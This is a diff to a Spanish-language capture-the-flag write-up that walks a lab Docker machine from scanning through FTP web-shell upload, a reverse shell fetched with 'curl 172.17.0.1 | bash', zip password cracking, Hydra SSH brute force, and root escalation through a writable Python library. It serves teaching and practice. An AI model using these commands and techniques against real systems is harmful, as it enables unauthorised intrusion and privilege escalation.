@@ -66,7 +66,7 @@ Para configurar el entorno utilizaremos un contenedor Docker con el sistema oper
 
 ## WriteUp (vista atacante)
 
-Realizamos un escaneo de los puertos de la maquina y lo exportamos a un fichero
+Realizamos un escaneo de los puertos de la maquina y lo exportamos a un fichero.
 
 ![](Imagenes/1_diseñoInseguro.png)
 
@@ -74,15 +74,15 @@ Con un script en python extraemos los puertos del fichero e identificamos que so
 
 ![](Imagenes/2_diseñoInseguro.png)
 
-Sabiendo los puertos realizamos un escaneo de los puertos para saber sus versiones y ejecutar unos scripts basicos para identificar alguna vulnerabilidad mediante **nmap**
+Sabiendo los puertos realizamos un escaneo de los puertos para saber sus versiones y ejecutar unos scripts basicos para identificar alguna vulnerabilidad mediante **nmap**.
 
 ![](Imagenes/3_diseñoInseguro.png)
 
-Accedemos a la web y mediante Wappalyzer visualizamos información acerca de la pagina web, por ejemplo, visualizamos que interpreta php.
+Accedemos a la web y mediante **Wappalyzer** visualizamos información acerca de la pagina web, por ejemplo, detectamos que la web interpreta codigo **php**.
 
 ![](Imagenes/4_diseñoInseguro.png)
 
-Utilizamos **WFUZZ** para escanear la pagina web e identificar rutas escondidas, de esta forma encontramos las rutas **ftp** y **documents**
+Utilizamos **WFUZZ** para escanear la pagina web e identificar rutas escondidas, de esta forma encontramos las rutas **ftp** y **documents**.
 
 ![](Imagenes/5_diseñoInseguro.png)
 
@@ -100,7 +100,7 @@ El fichero con los nombres se verá de la siguiente forma.
 
 ![](Imagenes/8_diseñoInseguro.png)
 
-Al volver a revisar las versiones de los servicios, nos damos cuenta que la versión 7.2 de SSH es vulnerable a enumeración de usuarios del sistema.
+Al volver a revisar las versiones de los servicios, nos damos cuenta que la **versión 7.2 de SSH** es vulnerable a enumeración de usuarios del sistema.
 
 ![](Imagenes/9_diseñoInseguro.png)
 
@@ -122,58 +122,112 @@ Este fichero lo llamamos **cmd.php** y lo subimos dentro del directorio **elijah
 ![](Imagenes/14_diseñoInseguro.png)
 ![](Imagenes/13_diseñoInseguro.png)
 
-En la web accedemos a
+En la web accedemos a **http://172.17.0.2/documents/elijah/cmd.php** y vemos que aqui se encuentra el fichero cmd.php que hemos subido mediante **FTP**.
+
+Para verificar que podemos ejecutar comandos, escribimos lo siguiente en la web **http://172.17.0.2/documents/elijah/cmd.php?cmd=whoami** y nos devuelve que el usuario que ejecuta los comandos es **www-data**.
 
 ![](Imagenes/15_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Con el siguiente comando verificamos que nos encontramos en la maquina **http://172.17.0.2/documents/elijah/cmd.php?cmd=ifconfig**.
 
 ![](Imagenes/16_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
-
-![](Imagenes/17_diseñoInseguro.png)
-
-Realizamos un escaneo de los puertos de la maquina.
+Previamente a ejecutar una reverse shell, debemos crear un fichero **index.html** que compartiremos mediante un servidor web en python, además de ponernos en escucha por el puerto 443.
 
 ![](Imagenes/18_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Para ejecutarnos una reverse shell escribiremos lo siguiente en la URL **http://172.17.0.2/documents/elijah/cmd.php?cmd=curl 172.17.0.1 | bash**.
+
+![](Imagenes/17_diseñoInseguro.png)
+
+Desde el terminal que estamos en escucha por el **puerto 443** obtenemos una **reverse shell** a la maquina con el usuario **www-data**.
+
+Seguidamente empezaremos con el tratamiento de la **TTY**.
 
 ![](Imagenes/19_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
-
 ![](Imagenes/20_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Investigando los ficheros de la maquina vemos que en **/var/www/** existe un fichero **caroline.jpg** el cual es bastante sospechoso.
 
-![](Imagenes/21_diseñoInseguro.png)
+Compartimos este fichero de **caroline.jpg** en un servidor web para despues descargarlo desde nuestra maquina atacante.
 
-Realizamos un escaneo de los puertos de la maquina.
+Tambien calcumos el hash md5 para verificar si ambos hash (original y descargado en la maquina atacante) del fichero **caroline.jpg** son iguales.
 
-![](Imagenes/22_diseñoInseguro.png)
-
-Realizamos un escaneo de los puertos de la maquina.
+Además si miramos los usuarios del sistema, vemos que **caroline** es una usuaria del sistema la cual se puede hacer **login**.
 
 ![](Imagenes/23_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Desde nuestra maquina atacante descargamos el fichero **caroline.jpg** y calculamos el hash md5 para verificar que coincide con la maquina atacada.
+
+![](Imagenes/22_diseñoInseguro.png)
+
+Con la herramienta **binwalk** detectamos la imagen **caroline.jpg** tiene un fichero **zip** escondido, por lo cual lo extraemos.
 
 ![](Imagenes/24_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Intentamos descomprimir el fichero **zip** pero se encuentra protegido con contraseña.
 
 ![](Imagenes/25_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Con la herramienta de **zip2john** extraemos el hash del fichero **zip** y guardamos el hash en un fichero **hash.txt**.
 
 ![](Imagenes/26_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Con la herramienta de **John** crackeamos la contraseña del fichero **hash.txt** con el diccionario de contraseñas de **rockyou.txt**.
+
+De esta forma obtenemos la contraseña del fichero **zip** que es **hellokitty**.
 
 ![](Imagenes/27_diseñoInseguro.png)
 
-Realizamos un escaneo de los puertos de la maquina.
+Extraemos el contenido del **zip** y vemos que se nos ha extraído un fichero **pwd.txt** que si mostramos su contenido vemos un listado con muchas contraseñas.
 
 ![](Imagenes/28_diseñoInseguro.png)
+
+![](Imagenes/29_diseñoInseguro.png)
+
+Con la herramienta de **Hydra** hacemos fuerza bruta al servicio de **SSH** con el listado de contraseñas de **pwd.txt** y el usuario **caroline**, de esta forma obtenemos la contraseña de **caroline** que nos permitirá acceder a la maquina autenticados como **caroline**.
+
+La contraseña de la usuaria **caroline** es **_Empleado46**.
+
+![](Imagenes/30_diseñoInseguro.png)
+
+Desde el usuario de **www-data** hacemos el cambio de usuario a **caroline** y nos autenticamos con la contraseña que hemos obtenido.
+
+Verificamos con **whoami** que ahora somos la usuaria de sistema **caroline**.
+
+![](Imagenes/31_diseñoInseguro.png)
+
+Dentro del **home** de **caroline** podemos visualizar la flag de **user.txt**, entre otros ficheros y un script en **python**.
+
+![](Imagenes/32_diseñoInseguro.png)
+
+Ejecutando **sudo -l** nos encontramos que la usuaria **caroline** tiene permisos para ejecutar como cualquier usuario (incluido **root**) sin necesidad necesidad de contraseña el binario de **python3.10**.
+
+![](Imagenes/33_diseñoInseguro.png)
+
+Investigando el codigo del script en **python** que encontramos en el **home** de **caroline** vemos que este script utiliza las librerias de **base64** y **sys**.
+
+![](Imagenes/34_diseñoInseguro.png)
+
+Probamos el funcionamiento del script y detectamos que su función es recibir un **parametro** y convertir este **parametro** a **base64** para luego mostrarlo por pantalla.
+
+![](Imagenes/35_diseñoInseguro.png)
+
+Buscamos la ruta de la liberia **base64** y encontramos que se ubica en **/usr/lib/python3.10/**, esta libreria de **base64** tiene como nombre **base64.py** y detectamos que tiene permisos incorrectamente configurados ya que **otros usuarios** aparte del **propietario** pueden modificar el contenido del fichero **base64.py**.
+
+![](Imagenes/36_diseñoInseguro.png)
+
+Despues de haber comprendido el funciomiento del script en python, sabemos que el script utiliza la función **b64encode**.
+
+Por lo cual modificamos el fichero **base64.py** para importar la libreria **os**, además de añadir en la función **b64encode** una linea de codigo que **spawnee** una **bash** del usuario que ejecuta el **script**.
+
+![](Imagenes/37_diseñoInseguro.png)
+
+![](Imagenes/38_diseñoInseguro.png)
+
+Como tenemos permisos para ejecutar **python3.10** como **root**, ejecutamos este script con **sudo** para que se ejecute como si lo estuviera ejecutando el usuario **root**, de esta forma se **spawneara** una **shell** en **bash**, en la cual podemos verificar que hemos escalado privilegios a **root**.
+
+Si nos dirigimos a la ruta de **/root/** podemos visualizar la flag de **root.txt**.
+
+![](Imagenes/39_diseñoInseguro.png)
